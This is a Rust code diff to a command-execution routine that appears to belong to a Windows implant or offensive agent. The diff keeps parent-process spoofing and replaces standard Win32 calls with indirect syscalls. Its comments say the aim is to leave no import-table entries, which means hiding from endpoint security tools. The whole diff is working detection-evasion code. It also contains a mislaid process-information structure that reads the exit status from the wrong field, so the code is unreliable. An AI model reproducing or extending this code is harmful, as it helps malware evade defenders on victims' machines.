@@ -15,14 +15,7 @@ pub fn execute_command(
     use winapi::um::winbase::{CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
     use winapi::um::winnt::{HANDLE, PROCESS_CREATE_PROCESS};
     const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::processthreadsapi::GetExitCodeProcess;
-    use winapi::um::processthreadsapi::OpenProcess;
-    use winapi::um::synchapi::WaitForSingleObject;
-    use winapi::um::winbase::INFINITE;
-
     use winapi::um::fileapi::ReadFile;
-    use winapi::um::handleapi::SetHandleInformation;
     use winapi::um::namedpipeapi::CreatePipe;
     use winapi::um::winbase::HANDLE_FLAG_INHERIT;
     use winapi::um::winbase::STARTF_USESTDHANDLES;
@@ -31,10 +24,25 @@ pub fn execute_command(
         crate::process_manager::get_spoof_parent_pid().unwrap_or_else(|| std::process::id());
 
     unsafe {
-        let mut p_handle: HANDLE = std::ptr::null_mut();
+        // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
+        let mut p_handle_raw: usize = 0;
         if parent_pid != std::process::id() {
-            p_handle = OpenProcess(PROCESS_CREATE_PROCESS, 0, parent_pid);
+            let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+            obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+            let mut client_id = [0u64; 2];
+            client_id[0] = parent_pid as u64;
+            let status = syscall!(
+                "NtOpenProcess",
+                &mut p_handle_raw as *mut _ as u64,
+                PROCESS_CREATE_PROCESS as u64,
+                &mut obj_attr as *mut _ as u64,
+                client_id.as_mut_ptr() as u64,
+            );
+            if status.is_err() || status.unwrap() < 0 {
+                p_handle_raw = 0;
+            }
         }
+        let mut p_handle: HANDLE = if p_handle_raw != 0 { p_handle_raw as *mut _ } else { std::ptr::null_mut() };
 
         let mut size = 0;
         InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut size);
@@ -79,7 +87,21 @@ pub fn execute_command(
             sec_attr.bInheritHandle = 1; // TRUE
 
             if CreatePipe(&mut stdout_rd, &mut stdout_wr, &mut sec_attr, 0) != 0 {
-                SetHandleInformation(stdout_rd, HANDLE_FLAG_INHERIT, 0); // read handle not inherited
+                // SetHandleInformation → NtSetInformationObject (indirect syscall, no IAT entry)
+                // ObjectHandleFlagInformation = 4: { Inherit, ProtectFromClose }
+                #[repr(C)]
+                struct ObjHandleFlagInfo {
+                    inherit: u8,
+                    protect_from_close: u8,
+                }
+                let flag_info = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
+                let _ = syscall!(
+                    "NtSetInformationObject",
+                    stdout_rd as u64,                            // Handle
+                    4u64,                                        // ObjectHandleFlagInformation
+                    &flag_info as *const _ as u64,              // Info
+                    std::mem::size_of::<ObjHandleFlagInfo>() as u64, // Length
+                );
                 si.StartupInfo.hStdOutput = stdout_wr;
                 si.StartupInfo.hStdError = stdout_wr;
                 si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
@@ -166,11 +188,38 @@ pub fn execute_command(
             pe_resolve::close_handle(stdout_rd);
         }
 
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        let mut exit_code: u32 = 0;
-        GetExitCodeProcess(pi.hProcess, &mut exit_code);
-        pe_resolve::close_handle(pi.hThread);
-        pe_resolve::close_handle(pi.hProcess);
+        // WaitForSingleObject → NtWaitForSingleObject (indirect syscall, no IAT entry)
+        let _ = syscall!(
+            "NtWaitForSingleObject",
+            pi.hProcess as u64,    // Handle
+            0u64,                    // Alertable = FALSE
+            std::ptr::null::<u64>() as u64, // Timeout = NULL (infinite)
+        );
+
+        // GetExitCodeProcess → NtQueryInformationProcess(ProcessBasicInformation)
+        // PROCESS_BASIC_INFORMATION contains ExitStatus as the first field after the NTSTATUS.
+        #[repr(C)]
+        struct ProcessBasicInformation {
+            reserved1: *mut std::ffi::c_void,
+            peb_base_address: *mut std::ffi::c_void,
+            reserved2: [*mut std::ffi::c_void; 2],
+            unique_process_id: usize,
+            inherited_from_unique_process_id: usize,
+            exit_status: i32,
+        }
+        let mut pbi: ProcessBasicInformation = std::mem::zeroed();
+        let _ = syscall!(
+            "NtQueryInformationProcess",
+            pi.hProcess as u64,                            // ProcessHandle
+            0u64,                                           // ProcessBasicInformation
+            &mut pbi as *mut _ as u64,                     // ProcessInformation
+            std::mem::size_of::<ProcessBasicInformation>() as u64, // Length
+            std::ptr::null_mut::<u64>() as u64,            // ReturnLength
+        );
+        let exit_code = if pbi.exit_status == 259 { 259u32 } else { pbi.exit_status as u32 };
+
+        let _ = syscall!("NtClose", pi.hThread as u64);
+        let _ = syscall!("NtClose", pi.hProcess as u64);
 
         use std::os::windows::process::ExitStatusExt;
         Ok(std::process::Output {
